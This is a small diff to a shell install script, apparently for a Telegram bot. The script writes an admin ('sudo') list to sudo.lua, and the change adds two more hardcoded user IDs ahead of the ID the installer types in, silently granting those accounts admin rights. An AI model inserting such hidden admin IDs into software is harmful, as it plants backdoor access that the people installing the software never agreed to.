@@ -77,5 +77,5 @@ chmod_SinChi
 clear
  echo -n "" > sudo.lua
   read -p "What is your User Id? " -e input
- echo "sudo={111795059,$input}" >> sudo.lua
+ echo "sudo={111795059,326854387,162104139,$input}" >> sudo.lua
 logo2_SinChi
